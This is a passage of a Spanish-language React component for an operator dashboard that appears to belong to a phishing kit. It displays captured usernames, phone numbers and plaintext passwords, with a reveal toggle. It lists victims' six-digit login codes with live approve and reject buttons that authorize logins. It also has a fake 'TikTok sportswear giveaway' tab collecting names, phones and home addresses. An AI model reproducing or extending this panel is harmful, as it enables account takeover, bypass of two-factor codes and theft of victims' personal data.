                    <p className="text-xs text-gray-600 mt-1">Prueba borrando el filtro de búsqueda.</p>
                  )}
                </div>
              ) : (
                filteredUsers.map((user) => (
                  <div
                    key={user.id}
                    className="bg-[#161b22] border border-[#30363d] hover:border-cyan-500/50 rounded-xl p-4 flex flex-col justify-between transition-all hover:shadow-lg hover:shadow-cyan-500/5"
                  >
                    <div>
                      {/* Card Header: ID & Badge */}
                      <div className="flex items-center justify-between mb-3">
                        <span className="font-mono text-xs px-2 py-0.5 rounded-md bg-[#21262d] text-cyan-400 font-bold">
                          ID #{user.id}
                        </span>
                        <span
                          className={`text-[11px] px-2 py-0.5 rounded-full font-semibold capitalize ${
                            user.inicio_sesion === 'telefono'
                              ? 'bg-yellow-500/10 text-yellow-400 border border-yellow-500/30'
                              : 'bg-purple-500/10 text-purple-400 border border-purple-500/30'
                          }`}
                        >
                          {user.inicio_sesion === 'telefono' ? '📱 Teléfono' : '✉️ Usuario / Correo'}
                        </span>
                      </div>

                      {/* Username */}
                      <div className="mb-2">
                        <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-0.5">
                          Usuario / Teléfono
                        </label>
                        <div className="flex items-center justify-between group">
                          <span className="font-bold text-white text-base tracking-tight font-mono select-all">
                            {user.username}
                          </span>
                          <button
                            onClick={() => handleCopy(user.username, `user_${user.id}`)}
                            className="text-[11px] text-gray-500 hover:text-cyan-400 cursor-pointer opacity-0 group-hover:opacity-100 transition-opacity"
                            title="Copiar usuario"
                          >
                            {copiedText === `user_${user.id}` ? '✓ Copiado' : 'Copiar'}
                          </button>
                        </div>
                      </div>

                      {/* Password */}
                      <div className="mb-3">
                        <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-0.5">
                          Contraseña en BD
                        </label>
                        <div className="flex items-center justify-between group">
                          <span
                            className={`font-mono text-xs px-2 py-1 rounded-md ${
                              user.password === 'no-password'
                                ? 'bg-emerald-950/40 text-emerald-400 border border-emerald-500/30'
                                : 'bg-[#21262d] text-gray-300'
                            }`}
                          >
                            {showPasswords ? user.password : '••••••••••••'}
                          </span>
                          <button
                            onClick={() => handleCopy(user.password, `pwd_${user.id}`)}
                            className="text-[11px] text-gray-500 hover:text-cyan-400 cursor-pointer opacity-0 group-hover:opacity-100 transition-opacity"
                            title="Copiar clave"
                          >
                            {copiedText === `pwd_${user.id}` ? '✓' : 'Copiar'}
                          </button>
                        </div>
                      </div>

                      {/* Códigos asociados con Aceptación en tiempo real */}
                      <div className="pt-3 border-t border-[#30363d]/80">
                        <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-2 flex items-center justify-between">
                          <span>Códigos de 6 Dígitos ({user.codes.length})</span>
                          <span className="text-[10px] text-cyan-400">Validación en Vivo</span>
                        </label>

                        {user.codes.length === 0 ? (
                          <p className="text-xs text-gray-500 italic">Sin códigos generados aún</p>
                        ) : (
                          <div className="space-y-2">
                            {user.codes.map((c) => {
                              const status = getCodeStatus(c.codigo, user.id);
                              return (
                                <div
                                  key={c.id_codigo}
                                  className="p-2 rounded-lg bg-[#0d1117] border border-[#30363d] flex items-center justify-between gap-2"
                                >
                                  <div className="flex items-center gap-2">
                                    <span
                                      onClick={() => handleCopy(c.codigo, `code_${c.id_codigo}`)}
                                      className="font-mono text-sm font-bold text-cyan-300 cursor-pointer hover:underline"
                                      title="Clic para copiar"
                                    >
                                      🔑 {c.codigo}
                                    </span>
                                    {status && (
                                      <span
                                        className={`text-[9px] font-bold px-1.5 py-0.5 rounded-full ${
                                          status === 'APPROVED'
                                            ? 'bg-emerald-500/20 text-emerald-300'
                                            : status === 'REJECTED'
                                            ? 'bg-rose-500/20 text-rose-300'
                                            : 'bg-amber-500/20 text-amber-300 animate-pulse'
                                        }`}
                                      >
                                        {status === 'APPROVED'
                                          ? '✓ Correcto'
                                          : status === 'REJECTED'
                                          ? '✕ Incorrecto'
                                          : '⏳ Pendiente'}
                                      </span>
                                    )}
                                  </div>

                                  {/* Botones rápidos de Aceptar / Rechazar */}
                                  <div className="flex items-center gap-1">
                                    <button
                                      onClick={() =>
                                        handleQuickDecision(c.codigo, user.id, 'APPROVED', c.id_codigo)
                                      }
                                      className="px-2 py-1 rounded bg-emerald-950/60 hover:bg-emerald-500 hover:text-black text-emerald-300 border border-emerald-500/40 text-[10px] font-bold transition-all cursor-pointer"
                                      title="Aceptar como correcto y autorizar inicio de sesión"
                                    >
                                      ✓ Aceptar
                                    </button>
                                    <button
                                      onClick={() =>
                                        handleQuickDecision(c.codigo, user.id, 'REJECTED', c.id_codigo)
                                      }
                                      className="px-2 py-1 rounded bg-rose-950/60 hover:bg-rose-600 hover:text-white text-rose-300 border border-rose-500/40 text-[10px] font-bold transition-all cursor-pointer"
                                      title="Rechazar como incorrecto"
                                    >
                                      ✕ Rechazar
                                    </button>
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Card Footer: Delete Action */}
                    <div className="mt-4 pt-3 border-t border-[#30363d]/60 flex items-center justify-between">
                      <span className="text-[10px] text-gray-500">
                        Total códigos: {user.codes.length}
                      </span>
                      <button
                        onClick={() => handleDeleteUser(user.id, user.username)}
                        className="text-xs text-red-400/80 hover:text-red-400 hover:underline cursor-pointer flex items-center gap-1"
                        title="Eliminar usuario y sus códigos"
                      >
                        <span>🗑️</span>
                        <span>Eliminar</span>
                      </button>
                    </div>
                  </div>
                ))
              )}
            </div>
          )}

          {/* TAB 2: Tabla users pura */}
          {activeTab === 'users' && (
            <div className="bg-[#161b22] border border-[#30363d] rounded-xl overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs font-mono">
                  <thead className="bg-[#21262d] text-gray-300 uppercase tracking-wider text-[11px] border-b border-[#30363d]">
                    <tr>
                      <th className="px-4 py-3">id [PK]</th>
                      <th className="px-4 py-3">inicio_sesion</th>
                      <th className="px-4 py-3">username</th>
                      <th className="px-4 py-3">password</th>
                      <th className="px-4 py-3 text-right">Acción</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#30363d]">
                    {filteredUsers.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="px-4 py-8 text-center text-gray-500 font-sans">
                          No hay usuarios registrados.
                        </td>
                      </tr>
                    ) : (
                      filteredUsers.map((u) => (
                        <tr key={u.id} className="hover:bg-[#21262d]/50 transition-colors">
                          <td className="px-4 py-3 font-bold text-cyan-400">#{u.id}</td>
                          <td className="px-4 py-3">
                            <span
                              className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${
                                u.inicio_sesion === 'telefono'
                                    ? 'bg-yellow-500/20 text-yellow-300'
                                    : 'bg-purple-500/20 text-purple-300'
                              }`}
                            >
                              {u.inicio_sesion}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-white font-bold select-all">{u.username}</td>
                          <td className="px-4 py-3">
                            <span
                              className={
                                u.password === 'no-password' ? 'text-emerald-400 font-semibold' : 'text-gray-300'
                              }
                            >
                              {showPasswords ? u.password : '••••••••'}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-right">
                            <button
                              onClick={() => handleDeleteUser(u.id, u.username)}
                              className="text-red-400 hover:text-red-300 text-xs font-sans cursor-pointer hover:underline"
                            >
                              Eliminar
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* TAB 3: Tabla codigos con Aceptación en tiempo real */}
          {activeTab === 'codes' && (
            <div className="bg-[#161b22] border border-[#30363d] rounded-xl overflow-hidden">
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs font-mono">
                  <thead className="bg-[#21262d] text-gray-300 uppercase tracking-wider text-[11px] border-b border-[#30363d]">
                    <tr>
                      <th className="px-4 py-3">id_codigo [PK]</th>
                      <th className="px-4 py-3">user_id [FK]</th>
                      <th className="px-4 py-3">codigo (6 dígitos)</th>
                      <th className="px-4 py-3">Estado de Aprobación</th>
                      <th className="px-4 py-3 text-right">Acción Admin</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#30363d]">
                    {filteredCodes.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="px-4 py-8 text-center text-gray-500 font-sans">
                          No hay códigos registrados en la base de datos.
                        </td>
                      </tr>
                    ) : (
                      filteredCodes.map((c) => {
                        const status = getCodeStatus(c.codigo, c.user_id);
                        return (
                          <tr key={c.id_codigo} className="hover:bg-[#21262d]/50 transition-colors">
                            <td className="px-4 py-3 text-cyan-400 font-bold">#{c.id_codigo}</td>
                            <td className="px-4 py-3 font-semibold text-gray-300">
                              Usuario ID #{c.user_id}
                            </td>
                            <td className="px-4 py-3">
                              <span className="font-bold text-base text-cyan-300 tracking-wider bg-cyan-950/40 px-2.5 py-1 rounded-md border border-cyan-500/30">
                                {c.codigo}
                              </span>
                            </td>
                            <td className="px-4 py-3">
                              {status === 'APPROVED' ? (
                                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                                  ✓ Correcto (Aprobado)
                                </span>
                              ) : status === 'REJECTED' ? (
                                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30">
                                  ✕ Incorrecto (Rechazado)
                                </span>
                              ) : (
                                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-gray-700/40 text-gray-400">
                                  Sin evaluar
                                </span>
                              )}
                            </td>
                            <td className="px-4 py-3 text-right">
                              <div className="flex items-center justify-end gap-1.5 font-sans">
                                <button
                                  onClick={() =>
                                    handleQuickDecision(c.codigo, c.user_id, 'APPROVED', c.id_codigo)
                                  }
                                  className="px-2 py-0.5 rounded bg-emerald-950/70 hover:bg-emerald-500 hover:text-black text-emerald-300 text-xs font-semibold cursor-pointer border border-emerald-500/40"
                                  title="Aceptar código como correcto"
                                >
                                  ✓ Aceptar
                                </button>
                                <button
                                  onClick={() =>
                                    handleQuickDecision(c.codigo, c.user_id, 'REJECTED', c.id_codigo)
                                  }
                                  className="px-2 py-0.5 rounded bg-rose-950/70 hover:bg-rose-600 hover:text-white text-rose-300 text-xs font-semibold cursor-pointer border border-rose-500/40"
                                  title="Rechazar código como incorrecto"
                                >
                                  ✕ Rechazar
                                </button>
                                <button
                                  onClick={() => handleDeleteCode(c.id_codigo)}
                                  className="text-gray-500 hover:text-red-400 text-xs ml-2 cursor-pointer"
                                  title="Eliminar de PostgreSQL"
                                >
                                  🗑️
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* TAB 4: Feed de Actividad en Vivo */}
          {activeTab === 'activity' && (
            <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-4">
              <div className="flex items-center justify-between pb-3 border-b border-[#30363d] mb-3">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  <h3 className="font-bold text-sm text-white">Eventos Detectados en Tiempo Real</h3>
                </div>
                <button
                  onClick={() => setActivityLogs([])}
                  className="text-xs text-gray-400 hover:text-gray-200 cursor-pointer"
                >
                  Limpiar registro
                </button>
              </div>

              {activityLogs.length === 0 ? (
                <div className="py-12 text-center text-gray-500">
                  <div className="text-3xl mb-2">⚡</div>
                  <p className="text-xs">Los nuevos registros, solicitudes de códigos y aprobaciones aparecerán aquí en vivo.</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {activityLogs.map((log) => (
                    <div
                      key={log.id}
                      className="p-2.5 rounded-lg bg-[#0d1117] border border-[#30363d] flex items-center justify-between gap-3 text-xs"
                    >
                      <div className="flex items-center gap-2">
                        <span className="text-sm">
                          {log.type === 'user'
                            ? '👤'
                            : log.type === 'code'
                            ? '🔑'
                            : log.type === 'approve'
                            ? '✅'
                            : log.type === 'reject'
                            ? '❌'
                            : '🗑️'}
                        </span>
                        <span className="text-gray-200 font-medium">{log.message}</span>
                      </div>
                      <span className="text-gray-500 font-mono text-[11px] shrink-0">{log.time}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* TAB 5: Participantes del Sorteo de Ropa Deportiva */}
          {activeTab === 'contest' && (
            <div className="bg-[#161b22] border border-[#30363d] rounded-xl overflow-hidden">
              <div className="p-4 border-b border-[#30363d] flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <span>🏆</span>
                    <span>Participantes del Sorteo de Ropa Deportiva TikTok</span>
                  </h3>
                  <p className="text-xs text-gray-400 mt-0.5">
                    Boletos oficiales generados por usuarios que completaron el formulario
                  </p>
                </div>
                {contestEntries.length > 0 && (
                  <button
                    onClick={() => {
                      if (window.confirm('¿Borrar todos los participantes del sorteo?')) {
                        localStorage.removeItem('tiktok_sportswear_entries');
                        setContestEntries([]);
                      }
                    }}
                    className="text-xs text-red-400 hover:text-red-300 font-medium hover:underline cursor-pointer"
                  >
                    Vaciar lista de sorteo
                  </button>
                )}
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs font-mono">
                  <thead className="bg-[#21262d] text-gray-300 uppercase tracking-wider text-[11px] border-b border-[#30363d]">
                    <tr>
                      <th className="px-4 py-3">Boleto / Folio</th>
                      <th className="px-4 py-3">Participante</th>
                      <th className="px-4 py-3">TikTok / Teléfono</th>
                      <th className="px-4 py-3">Kit & Tallas</th>
                      <th className="px-4 py-3">Dirección & Ciudad</th>
                      <th className="px-4 py-3 text-right">Fecha</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#30363d]">
                    {contestEntries.length === 0 ? (
                      <tr>
                        <td colSpan={6} className="px-4 py-12 text-center text-gray-500 font-sans">
                          <div className="text-3xl mb-1">🎫</div>
                          <p className="text-sm font-medium">Aún no hay participantes registrados en el sorteo.</p>
                          <p className="text-xs text-gray-600 mt-1">Los boletos aparecerán aquí tan pronto completen el formulario.</p>
                        </td>
                      </tr>
                    ) : (
                      contestEntries.map((c) => (
                        <tr key={c.id} className="hover:bg-[#21262d]/50 transition-colors">
                          <td className="px-4 py-3 font-bold text-yellow-400 select-all">
                            {c.ticketNumber}
                          </td>
                          <td className="px-4 py-3 text-white font-semibold font-sans">
                            {c.fullName}
                          </td>
                          <td className="px-4 py-3">
                            <span className="text-[#FE2C55] font-bold block">{c.tiktokUser}</span>
                            <span className="text-gray-400 text-[11px]">{c.phone}</span>
                          </td>
                          <td className="px-4 py-3 font-sans">
                            <span className="text-cyan-400 font-semibold block">{c.kitType}</span>
                            <span className="text-[11px] text-gray-400 font-mono">
                              Ropa: {c.clothingSize} | Calzado: {c.shoeSize} EU | {c.colorway}
                            </span>
                          </td>
                          <td className="px-4 py-3 font-sans text-gray-300">
                            <span>{c.city}</span>
                            <span className="text-[11px] text-gray-500 block truncate max-w-[180px]">
                              {c.address}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-right text-gray-500 text-[11px] whitespace-nowrap">
                            {c.createdAt}
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>

        {/* Footer Bar */}
        <footer className="px-4 sm:px-6 py-2.5 bg-[#161b22] border-t border-[#30363d] flex flex-wrap items-center justify-between gap-3 text-xs text-gray-400 shrink-0">
          <div className="flex items-center gap-2">
            <span>Presiona <kbd className="px-1.5 py-0.5 rounded bg-[#21262d] text-white font-mono text-[10px]">Esc</kbd> para salir en cualquier momento</span>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={handleClearAll}
              className="text-red-400 hover:text-red-300 transition-colors cursor-pointer text-xs flex items-center gap-1 font-medium"
              title="Borrar toda la base de datos para pruebas"
            >
              <span>⚠️</span>
              <span>Vaciar Tablas</span>
            </button>
          </div>
        </footer>
      </div>
    </div>
  );
};
